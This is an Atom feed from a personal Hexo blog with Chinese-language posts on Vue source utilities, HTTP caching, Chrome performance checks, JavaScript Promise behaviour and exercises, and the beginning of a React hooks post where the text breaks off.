<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Feynman 的博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://fuzhongfeng.github.io/"/>
  <updated>2022-06-05T03:20:44.479Z</updated>
  <id>https://fuzhongfeng.github.io/</id>
  
  <author>
    <name>Feynman</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vue源码阅读</title>
    <link href="https://fuzhongfeng.github.io/2022/02/20/vue-sourcecode/"/>
    <id>https://fuzhongfeng.github.io/2022/02/20/vue-sourcecode/</id>
    <published>2022-02-20T03:07:50.000Z</published>
    <updated>2022-06-05T03:20:44.479Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vue源码阅读"><a href="#vue源码阅读" class="headerlink" title="vue源码阅读"></a>vue源码阅读</h1><h2 id="1-工具方法的学习"><a href="#1-工具方法的学习" class="headerlink" title="1. 工具方法的学习"></a>1. 工具方法的学习</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Create a cached version of a pure function.</span><br><span class="line"> * 缓存函数，限定参数为string的情况下</span><br><span class="line"> */</span><br><span class="line">export function cached&lt;F: Function&gt; (fn: F): F &#123;</span><br><span class="line">  const cache = Object.create(null)</span><br><span class="line">  return (function cachedFn (str: string) &#123;</span><br><span class="line">    const hit = cache[str]</span><br><span class="line">    return hit || (cache[str] = fn(str))</span><br><span class="line">  &#125;: any)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Camelize a hyphen-delimited string.</span><br><span class="line"> * 转换为大驼峰</span><br><span class="line"> */</span><br><span class="line">const camelizeRE = /-(\w)/g</span><br><span class="line">export const camelize = cached((str: string): string =&gt; &#123;</span><br><span class="line">  return str.replace(camelizeRE, (_, c) =&gt; c ? c.toUpperCase() : &apos;&apos;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;vue源码阅读&quot;&gt;&lt;a href=&quot;#vue源码阅读&quot; class=&quot;headerlink&quot; title=&quot;vue源码阅读&quot;&gt;&lt;/a&gt;vue源码阅读&lt;/h1&gt;&lt;h2 id=&quot;1-工具方法的学习&quot;&gt;&lt;a href=&quot;#1-工具方法的学习&quot; class=&quot;header
      
    
    </summary>
    
      <category term="Vue" scheme="https://fuzhongfeng.github.io/categories/Vue/"/>
    
    
      <category term="Vue" scheme="https://fuzhongfeng.github.io/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>http cache</title>
    <link href="https://fuzhongfeng.github.io/2022/01/23/performance/"/>
    <id>https://fuzhongfeng.github.io/2022/01/23/performance/</id>
    <published>2022-01-23T12:47:00.000Z</published>
    <updated>2022-01-28T08:48:25.502Z</updated>
    
    <content type="html"><![CDATA[<h1 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h1><hr><p>良好的缓存策略可以降低资源的重复加载提高网页的整体加载速度，通常浏览器缓存策略分为两种：强缓存和协商缓存</p><h2 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h2><blockquote><p>在<em>响应头</em>中添加 <code>Expires: Thu, 28 Dec 2019 05:27:45 GMT</code> 或 <code>Cache-Control: public, max-age=2592000</code> 来控制强缓存。</p><ul><li>Expires 是 HTTP/1.0 的字段，它规定了缓存过期的一个绝对时间，过期后需再次请求。缺点：Expires 使用的是客户端本机时间不准确，所以引入了 Cache-Control:max-age。</li><li>Cache-Control 是 HTTP/1.1 的字段，它规定了缓存过期的一个相对时间。优先级：Cache-Control &gt; Expires。常用指令如下：<br>public: 任意一方都能缓存该资源(客户端、代理服务器等)。<br>max-age(秒)：缓存的时长，也是响应的最大的Age值。<br>s-maxage(秒)：公共缓存服务器响应的最大Age值。<br>no-cache: 浏览器每次使用url的缓存版本之前都必须与服务器重新验证<br>no-store: 浏览器和其他中间缓存（如CDN）从不存储任何版本的文件<br>private: 浏览器可以缓存，但是中间缓存不能</li><li>强缓存阶段如果本地缓存没有过期的话不会向服务器发送请求，状态码为200 (from disk cache)或是200 OK (from memory cache)</li></ul></blockquote><h2 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h2><blockquote><p>强缓存未命中将进入协商缓存。在<em>请求头</em>中添加 <code>If-Modified-Since: Tue, 28 Nov 2019 05:14:02 GMT</code> 或 <code>If-None-Match: W/&quot;5a1cf09a-63c6&quot;</code> 开启协商缓存，协商缓存阶段每次都会向浏览器发起请求。</p><ul><li>If-Modified-Since 中携带的信息为该资源上次请求的响应头中的 Last-Modified 字段。If-None-Match 中携带的信息为该资源上次请求的响应头中的 ETag 字段。服务器通过这两个字段来判断资源是否有修改，如果有修改则返回状态码200和新的内容，如果没有修改返回状态码304。</li><li>Last-Modified 是 HTTP/1.0 的字段。在第一次请求改资源时把这个标识放到响应头传到客户端，标记此资源在服务器端最后被修改的时间。缺点：如果某个资源只是修改了，但实际内容并没有发生变化，Last-Modified 无法判断出来。</li><li>ETag 是 HTTP/1.1 的字段。服务器通过某种算法对资源生成一个唯一的标识。在第一次请求该资源时把这个标识放到响应头传到客户端。优先级：ETag &gt; Last-Modified</li></ul></blockquote><h2 id="最佳实践："><a href="#最佳实践：" class="headerlink" title="最佳实践："></a>最佳实践：</h2><ol><li>通过版本化 URL 确定的资源，如 html 中引用的 css、js、图片等资源文件，需要随时更新。</li></ol><ul><li>通过 webpack contentHash 生成资源地址</li><li>设置长时间使用强缓存：<code>Cache-Control: max-age=31536000</code></li></ul><ol start="2"><li>不能通过版本化 URL 确定的资源，如 html 文件。（<code>https://xxx.com/index.2s19fg.html</code> 类似的地址显然是不合理的）</li></ol><ul><li>不使用强缓存：响应头设置 <code>Cache-Control: no-cache</code> 使用前与服务器重新验证</li><li>设置协商缓存：响应头设置 <code>ETag</code> 字段来验证过期缓存资源<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// nginx 配置</span><br><span class="line">location ~ .*\.(htm|html)$ &#123;</span><br><span class="line">    add_header Cache-Control no-cache;</span><br><span class="line">    add_header Pragma no-cache;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="设置及验证："><a href="#设置及验证：" class="headerlink" title="设置及验证："></a>设置及验证：</h2><p>这里给了一些 node express 服务器的配置、最佳实践方案、及验证方式：<a href="https://web.dev/codelab-http-cache" target="_blank" rel="noopener">https://web.dev/codelab-http-cache</a></p><h4 id="参考：https-web-dev-http-cache-examples"><a href="#参考：https-web-dev-http-cache-examples" class="headerlink" title="参考：https://web.dev/http-cache/#examples"></a>参考：<a href="https://web.dev/http-cache/#examples" target="_blank" rel="noopener">https://web.dev/http-cache/#examples</a></h4><h1 id="chrome-performance"><a href="#chrome-performance" class="headerlink" title="chrome performance"></a>chrome performance</h1><h2 id="performance-timing"><a href="#performance-timing" class="headerlink" title="performance.timing"></a>performance.timing</h2><p><img src="/images/timing.webp" alt="1"></p><h3 id="白屏"><a href="#白屏" class="headerlink" title="白屏"></a>白屏</h3><p>白屏时间 = 地址栏输入网址后回车 - 浏览器出现第一个元素<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 一般白屏结束时间定义为body渲染前，此script标签放在body前</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.whiteEnd = Date.now()</span><br><span class="line">    // 白屏时间</span><br><span class="line">    console.log(whiteEnd - performance.timing.navigationStart)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h2 id="判断网页内存溢出"><a href="#判断网页内存溢出" class="headerlink" title="判断网页内存溢出"></a>判断网页内存溢出</h2><p>问题：做课件撤销重做功能时，用两个数组存储页面的数据，上线一段时间后接到用户反馈页面崩溃的问题。初步猜测是内存溢出，那么如何验证是否为内存溢出呢？<br>验证方法：Chrome – More tools – Performance monitor – Js heap size<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 控制台手动模拟内存增加，查看 Js heap size 大小</span><br><span class="line">var arr = []</span><br><span class="line">for(let i = 0; i &lt; 100000000; i++) &#123;</span><br><span class="line">    arr.push(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;缓存&quot;&gt;&lt;a href=&quot;#缓存&quot; class=&quot;headerlink&quot; title=&quot;缓存&quot;&gt;&lt;/a&gt;缓存&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;良好的缓存策略可以降低资源的重复加载提高网页的整体加载速度，通常浏览器缓存策略分为两种：强缓存和协商缓存&lt;/p&gt;
&lt;h2 id=&quot;
      
    
    </summary>
    
      <category term="Performance" scheme="https://fuzhongfeng.github.io/categories/Performance/"/>
    
    
      <category term="Performance" scheme="https://fuzhongfeng.github.io/tags/Performance/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://fuzhongfeng.github.io/2022/01/23/hello-world/"/>
    <id>https://fuzhongfeng.github.io/2022/01/23/hello-world/</id>
    <published>2022-01-23T12:24:23.994Z</published>
    <updated>2022-01-23T12:24:23.994Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>JavaScript-Promise</title>
    <link href="https://fuzhongfeng.github.io/2020/11/25/javascript-promise/"/>
    <id>https://fuzhongfeng.github.io/2020/11/25/javascript-promise/</id>
    <published>2020-11-25T12:09:16.000Z</published>
    <updated>2022-06-04T09:15:49.732Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h1><h3 id="Promise-prototype-catch"><a href="#Promise-prototype-catch" class="headerlink" title="Promise.prototype.catch"></a>Promise.prototype.catch</h3><ol><li><p>可以捕获 Promise 参数函数和 then 内的错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">new Promise((r, j) =&gt; &#123;</span><br><span class="line">    throw new Error(&apos;err!!!&apos;)</span><br><span class="line">&#125;).then(() =&gt; &#123;</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;, e) // 触发</span><br><span class="line">&#125;)</span><br><span class="line">// catch Error: err!!!</span><br><span class="line"></span><br><span class="line">new Promise((r, j) =&gt; &#123;</span><br><span class="line">    r()</span><br><span class="line">&#125;).then(() =&gt; &#123;</span><br><span class="line">    throw new Error(&apos;err!!!&apos;)</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;, e) // 触发</span><br><span class="line">&#125;)</span><br><span class="line">// catch Error: err!!!</span><br></pre></td></tr></table></figure></li><li><p>不能捕获 Promise 参数函数和 then 内的任何异步函数的错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">new Promise((r, j) =&gt; &#123;</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">       throw new Error(&apos;err!!!&apos;)</span><br><span class="line">    &#125;, 3000)</span><br><span class="line">&#125;).then(() =&gt; &#123;</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;, e) // 不触发</span><br><span class="line">&#125;)</span><br><span class="line">// 无打印，没有捕获到错误</span><br></pre></td></tr></table></figure></li><li><p>如果 then 没有 onReject 函数，则会触发catch。参数为reject传入的值或 throw 的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">new Promise((r, j) =&gt; &#123;</span><br><span class="line">    j(&apos;reject!!!&apos;)</span><br><span class="line">&#125;).then(() =&gt; &#123;</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;, e)</span><br><span class="line">&#125;)</span><br><span class="line">// catch reject!!!</span><br><span class="line"></span><br><span class="line">new Promise((r, j) =&gt; &#123;</span><br><span class="line">    j(&apos;reject!!!&apos;)</span><br><span class="line">&#125;).then(() =&gt; &#123;</span><br><span class="line">&#125;, (e) =&gt; &#123;</span><br><span class="line">  console.log(&apos;onReject&apos;, e)</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;, e) // 不会执行到</span><br><span class="line">&#125;)</span><br><span class="line">// onReject reject!!!</span><br><span class="line"></span><br><span class="line">new Promise((r, j) =&gt; &#123;</span><br><span class="line">    throw new Error(&apos;错了&apos;)</span><br><span class="line">&#125;).then(() =&gt; &#123;&#125;, (e) =&gt; &#123; </span><br><span class="line">    console.log(&apos;reject&apos;, e) // 执行</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;, e) // 不执行</span><br><span class="line">&#125;)</span><br><span class="line">// reject 错了</span><br></pre></td></tr></table></figure></li><li><p>resolve 后的 throw Error 会被忽略</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">new Promise(function(r, j) &#123;</span><br><span class="line">  r();</span><br><span class="line">  console.log(&apos;resolve after&apos;);</span><br><span class="line">  throw &apos;resolve 后 throw&apos;;</span><br><span class="line">&#125;).catch(function(e) &#123;</span><br><span class="line">   console.log(e); // 不会执行</span><br><span class="line">&#125;);</span><br><span class="line">// resolve after</span><br></pre></td></tr></table></figure></li></ol><h3 id="源码实现"><a href="#源码实现" class="headerlink" title="源码实现"></a>源码实现</h3><p><a href="https://www.jianshu.com/p/43de678e918a" target="_blank" rel="noopener">https://www.jianshu.com/p/43de678e918a</a></p><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><blockquote><p>练习1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">JS实现一个带并发限制的异步调度器Scheduler，保证同时运行的任务最多有两个。完善代码中Scheduler类，使得以下程序能正确输出</span><br><span class="line">class Scheduler &#123;</span><br><span class="line">  add(promiseCreator) &#123; ... &#125;</span><br><span class="line">  // ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const timeout = (time) =&gt; new Promise(resolve =&gt; &#123;</span><br><span class="line">  setTimeout(resolve, time)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">const scheduler = new Scheduler()</span><br><span class="line"></span><br><span class="line">const addTask = (time, order) =&gt; &#123;</span><br><span class="line">  scheduler.add(</span><br><span class="line">      () =&gt; timeout(time)</span><br><span class="line">  ).then(() =&gt; console.log(order))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addTask(1000, &apos;1&apos;)</span><br><span class="line">addTask(500, &apos;2&apos;)</span><br><span class="line">addTask(300, &apos;3&apos;)</span><br><span class="line">addTask(400, &apos;4&apos;)// output: 2 3 1 4</span><br><span class="line">// 一开始，1、2两个任务进入队列</span><br><span class="line">// 500ms时，2完成，输出2，任务3进队</span><br><span class="line">// 800ms时，3完成，输出3，任务4进队</span><br><span class="line">// 1000ms时，1完成，输出1</span><br><span class="line">// 1200ms时，4完成，输出4</span><br><span class="line"></span><br><span class="line">答案：</span><br><span class="line">class Scheduler &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.limit = 2</span><br><span class="line">    this.list = []</span><br><span class="line">    this.count = 0</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  add(promiseCreator) &#123;</span><br><span class="line">    return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">      this.list.push([promiseCreator, resolve]);</span><br><span class="line">      this.process();</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  process() &#123;</span><br><span class="line">    if (this.count &gt;= this.limit) return;</span><br><span class="line"></span><br><span class="line">    if (this.list.length &gt; 0) &#123;</span><br><span class="line">      var item = this.list.shift();</span><br><span class="line"></span><br><span class="line">      item[0]().then(() =&gt; &#123;</span><br><span class="line">        this.count--;</span><br><span class="line">        item[1]();</span><br><span class="line"></span><br><span class="line">        this.process()</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      this.count++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>练习2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">async function async1() &#123;</span><br><span class="line">  console.log(&apos;async1 start&apos;);</span><br><span class="line">  await async2();</span><br><span class="line">  console.log(&apos;async1 end&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function async2() &#123;</span><br><span class="line">  console.log(&apos;async2&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(&apos;script start&apos;);</span><br><span class="line"></span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">    console.log(&apos;setTimeout&apos;);</span><br><span class="line">&#125;, 0);  </span><br><span class="line"></span><br><span class="line">async1();</span><br><span class="line"></span><br><span class="line">new Promise(function(resolve) &#123;</span><br><span class="line">    console.log(&apos;promise1&apos;);</span><br><span class="line">    resolve();</span><br><span class="line">    console.log(&apos;promise1 resolve after&apos;)</span><br><span class="line">    reject()</span><br><span class="line">  &#125;).then(function() &#123;</span><br><span class="line">    console.log(&apos;promise2&apos;);</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(&apos;script end&apos;);</span><br><span class="line"></span><br><span class="line">// script start</span><br><span class="line">// async1 start</span><br><span class="line">// async2</span><br><span class="line">// promise1</span><br><span class="line">// promise1 resolve after</span><br><span class="line">// script end</span><br><span class="line">// async1 end</span><br><span class="line">// promise2</span><br><span class="line">// setTimeout</span><br></pre></td></tr></table></figure></p></blockquote><h2 id="实现一个-Promise-all"><a href="#实现一个-Promise-all" class="headerlink" title="实现一个 Promise.all"></a>实现一个 Promise.all</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Promise.myAll = function(promiseArr) &#123;</span><br><span class="line">  return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">    var result = [];</span><br><span class="line">    var count = 0;</span><br><span class="line"></span><br><span class="line">    promiseArr.forEach((p, i) =&gt; &#123;</span><br><span class="line">      if (Object.prototype.toString.call(p) !== &apos;[object Promise]&apos;) &#123;</span><br><span class="line">        count++;</span><br><span class="line">        result[i] = p</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        p.then((d) =&gt; &#123;</span><br><span class="line">          count++;</span><br><span class="line">          result[i] = d</span><br><span class="line"></span><br><span class="line">          if (count === promiseArr.length) &#123;</span><br><span class="line">            resolve(result)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;).catch((e) =&gt; &#123;</span><br><span class="line">          reject(e)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var promise1 = Promise.resolve(3);</span><br><span class="line">var promise2 = 42;</span><br><span class="line">var promise3 = new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">  setTimeout(resolve, 5000, &apos;foo&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Promise.myAll([promise1, promise2, promise3]).then((data) =&gt; &#123;</span><br><span class="line">  console.log(data)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Promise&quot;&gt;&lt;a href=&quot;#Promise&quot; class=&quot;headerlink&quot; title=&quot;Promise&quot;&gt;&lt;/a&gt;Promise&lt;/h1&gt;&lt;h3 id=&quot;Promise-prototype-catch&quot;&gt;&lt;a href=&quot;#Promise-pr
      
    
    </summary>
    
      <category term="JavaScript" scheme="https://fuzhongfeng.github.io/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="https://fuzhongfeng.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>React</title>
    <link href="https://fuzhongfeng.github.io/2020/09/25/react/"/>
    <id>https://fuzhongfeng.github.io/2020/09/25/react/</id>
    <published>2020-09-25T08:33:56.000Z</published>
    <updated>2022-01-23T12:24:24.012Z</updated>
    
    <content type="html"><![CDATA[<h1 id="React"><a href="#React" class="headerlink" title="React"></a>React</h1><h2 id="react-hooks"><a href="#react-hooks" class="headerlink" title="react-hooks"></a>react-hooks</h2><blockquote><h3 id="useState"><a href="#useState" class="headerlink" title="useState"></a>useState</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">const [state, setState] = useState(1)</span><br><span class="line"></span><br><span class="line">// 如果通过点击事件回调多次调用传入相同值会触发更新吗？</span><br><span class="line">// 答：不会，因为 React 使用 Object.is 比较算法来比较 state。如果传入值相同则会跳过更新。</span><br><span class="line">// 这一点与 class 组件的 setState 是不同的。</span><br><span class="line">const handleClick = () =&gt; &#123;</span><br><span class="line">  setState(1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 如果新的 state 需要通过使用先前的 state 计算得出，那么可以将函数传递给 setState。该函数将接收先前的 state，并返回一个更新后的值</span><br><span class="line">const handleClick = () =&gt; &#123;</span><br><span class="line">  // 调用多次后 count 会累加。</span><br><span class="line">  setState(pre =&gt; pre + 1)</span><br><span class="line">  setState(pre =&gt; pre + 1)</span><br><span class="line">  setState(pre =&gt; pre + 1)</span><br><span class="line"></span><br><span class="line">  // 调用多次后 count 只会增加 1</span><br><span class="line">  setState(count + 1)</span><br><span class="line">  setState(count + 1)</span><br><span class="line">  setState(count + 1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><blockquote><h3 id="useMemo"><a href="#useMemo" class="headerlink" 